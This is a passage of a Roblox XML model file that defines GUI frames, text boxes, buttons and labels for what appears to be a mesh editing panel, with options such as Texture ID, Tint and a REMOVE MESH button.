										<bool name="TextWrapped">true</bool>
										<token name="TextXAlignment">0</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="Frame" referent="RBXBC5DB26116BB49D5B37683AB692C9939">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4294967295</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">TextBoxBorder</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>56</XO>
											<YS>0</YS>
											<YO>17</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>85</XO>
											<YS>0</YS>
											<YO>3</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
									<Item class="Frame" referent="RBXE7C5008DDB4347FEA9A78A28CAB2F40D">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4283760767</Color3>
											<float name="BackgroundTransparency">0</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">BottomBorder</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>1</YS>
												<YO>-1</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>1</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
									<Item class="Frame" referent="RBXA4F6BEE4EF4A47398799CB3C47DC85C3">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4283760767</Color3>
											<float name="BackgroundTransparency">0</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">LeftBorder</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>0</XS>
												<XO>1</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
									<Item class="Frame" referent="RBXFA60B2C09E5444389A948C23A3F1E735">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4283760767</Color3>
											<float name="BackgroundTransparency">0</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">RightBorder</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>1</XS>
												<XO>-1</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>0</XS>
												<XO>1</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
								</Item>
								<Item class="Frame" referent="RBX104D27D6145747049B7C7534A7D82D81">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4283760767</Color3>
										<float name="BackgroundTransparency">0.899999976</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">TextBoxBackground</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>55</XO>
											<YS>0</YS>
											<YO>-2</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>86</XO>
											<YS>0</YS>
											<YO>22</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextButton" referent="RBXB0074FFD8EA048FE9F5DA96AD5DB4A3F">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">true</bool>
										<Color3 name="BackgroundColor3">4294967295</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">3</token>
										<token name="FontSize">5</token>
										<bool name="Modal">false</bool>
										<string name="Name">TextButton</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>60</XO>
											<YS>0</YS>
											<YO>-1</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>80</XO>
											<YS>0</YS>
											<YO>18</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<string name="Text"></string>
										<Color3 name="TextColor3">4279970357</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">14</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">1</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">false</bool>
										<token name="TextXAlignment">2</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">2</int>
									</Properties>
								</Item>
							</Item>
							<Item class="Frame" referent="RBX062A554D630D4E51B8278865AF3384ED">
								<Properties>
									<bool name="Active">false</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<Color3 name="BackgroundColor3">4285215356</Color3>
									<float name="BackgroundTransparency">0</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">0</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<string name="Name">BottomColorBar</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>5</XO>
										<YS>1</YS>
										<YO>-2</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>1</XS>
										<XO>0</XO>
										<YS>0</YS>
										<YO>2</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<token name="Style">0</token>
									<bool name="Visible">true</bool>
									<int name="ZIndex">1</int>
								</Properties>
							</Item>
							<Item class="Frame" referent="RBX529931BAE303474C854D08F8D9D592E8">
								<Properties>
									<bool name="Active">false</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<Color3 name="BackgroundColor3">4288914085</Color3>
									<float name="BackgroundTransparency">1</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">0</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<string name="Name">TextureIDOption</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>14</XO>
										<YS>0</YS>
										<YO>165</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>1</XS>
										<XO>0</XO>
										<YS>0</YS>
										<YO>25</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<token name="Style">0</token>
									<bool name="Visible">false</bool>
									<int name="ZIndex">1</int>
								</Properties>
								<Item class="TextLabel" referent="RBX90A76D9E0D2D432EA8111DBF08444B41">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4288914085</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">2</token>
										<token name="FontSize">4</token>
										<string name="Name">Label</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>70</XO>
											<YS>0</YS>
											<YO>25</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<string name="Text">Texture ID</string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">true</bool>
										<token name="TextXAlignment">0</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextBox" referent="RBX2AD9577A4AFA4F52AD9C8F2512E36616">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4283760767</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4278190080</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClearTextOnFocus">true</bool>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">4</token>
										<token name="FontSize">6</token>
										<bool name="MultiLine">false</bool>
										<string name="Name">TextBox</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>65</XO>
											<YS>0</YS>
											<YO>-1</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">true</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<bool name="ShowNativeInput">true</bool>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>80</XO>
											<YS>0</YS>
											<YO>18</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<string name="Text"></string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">true</bool>
										<float name="TextSize">18</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0.5</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">true</bool>
										<token name="TextXAlignment">0</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="Frame" referent="RBXBCF1143A733240888BF1F8D9D24A8866">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4294967295</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">TextBoxBorder</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>61</XO>
											<YS>0</YS>
											<YO>17</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>85</XO>
											<YS>0</YS>
											<YO>3</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
									<Item class="Frame" referent="RBX59941960C38546C2A8E4D22CB2ABBF7F">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4283760767</Color3>
											<float name="BackgroundTransparency">0</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">BottomBorder</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>1</YS>
												<YO>-1</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>1</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
									<Item class="Frame" referent="RBX4EB49808C0FD4B70B53D7DDDC7310B32">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4283760767</Color3>
											<float name="BackgroundTransparency">0</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">LeftBorder</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>0</XS>
												<XO>1</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
									<Item class="Frame" referent="RBX3820F4C2AC094894926D5ADD62D76529">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4283760767</Color3>
											<float name="BackgroundTransparency">0</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">RightBorder</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>1</XS>
												<XO>-1</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>0</XS>
												<XO>1</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
								</Item>
								<Item class="Frame" referent="RBXB93ABC17FED74CD6B1DE2730985D20C0">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4283760767</Color3>
										<float name="BackgroundTransparency">0.899999976</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">TextBoxBackground</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>60</XO>
											<YS>0</YS>
											<YO>-2</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>86</XO>
											<YS>0</YS>
											<YO>22</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextButton" referent="RBXA220FF5421B34254AE7A2F0CE5BFC4ED">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">true</bool>
										<Color3 name="BackgroundColor3">4294967295</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">3</token>
										<token name="FontSize">5</token>
										<bool name="Modal">false</bool>
										<string name="Name">TextButton</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>65</XO>
											<YS>0</YS>
											<YO>-1</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>80</XO>
											<YS>0</YS>
											<YO>18</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<string name="Text"></string>
										<Color3 name="TextColor3">4279970357</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">14</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">1</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">false</bool>
										<token name="TextXAlignment">2</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">2</int>
									</Properties>
								</Item>
							</Item>
							<Item class="Frame" referent="RBXAE4E860139F34B499161BD2D01996CB1">
								<Properties>
									<bool name="Active">false</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<Color3 name="BackgroundColor3">4278190080</Color3>
									<float name="BackgroundTransparency">1</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">0</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<string name="Name">RemoveButton</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>10</XO>
										<YS>1</YS>
										<YO>-30</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>1</XS>
										<XO>-10</XO>
										<YS>0</YS>
										<YO>20</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<token name="Style">0</token>
									<bool name="Visible">false</bool>
									<int name="ZIndex">1</int>
								</Properties>
								<Item class="TextButton" referent="RBXD6073362322D46E5AC20FFC7FA18FFB1">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">true</bool>
										<Color3 name="BackgroundColor3">4278190080</Color3>
										<float name="BackgroundTransparency">0.449999988</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">2</token>
										<token name="FontSize">4</token>
										<bool name="Modal">false</bool>
										<string name="Name">Button</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>0</XO>
											<YS>1</YS>
											<YO>0</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<string name="Text">REMOVE MESH</string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0.800000012</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">false</bool>
										<token name="TextXAlignment">2</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="Frame" referent="RBX045DBD0E5E284A6786E25930AB17EB4D">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4278190080</Color3>
										<float name="BackgroundTransparency">0.300000012</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">Shadow</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>1</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>2</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">2</int>
									</Properties>
								</Item>
							</Item>
							<Item class="Frame" referent="RBX74414BB60DAE46DBA8B250EECF3F1C92">
								<Properties>
									<bool name="Active">false</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<Color3 name="BackgroundColor3">4288914085</Color3>
									<float name="BackgroundTransparency">1</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">0</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<string name="Name">TintOption</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>0</XO>
										<YS>0</YS>
										<YO>200</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>0</XS>
										<XO>0</XO>
										<YS>0</YS>
										<YO>0</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<token name="Style">0</token>
									<bool name="Visible">false</bool>
									<int name="ZIndex">1</int>
								</Properties>
								<Item class="TextLabel" referent="RBX502A656FE90A4BBFBD4E1D3C9E2EDCC8">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4288914085</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">2</token>
										<token name="FontSize">4</token>
										<string name="Name">Label</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>14</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>70</XO>
											<YS>0</YS>
											<YO>25</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<string name="Text">Tint</string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">true</bool>
										<token name="TextXAlignment">0</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="Frame" referent="RBX03D48F5705324958ADBED7FE88B7CDB1">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4288914085</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">BInput</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>114</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>38</XO>
											<YS>0</YS>
											<YO>25</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
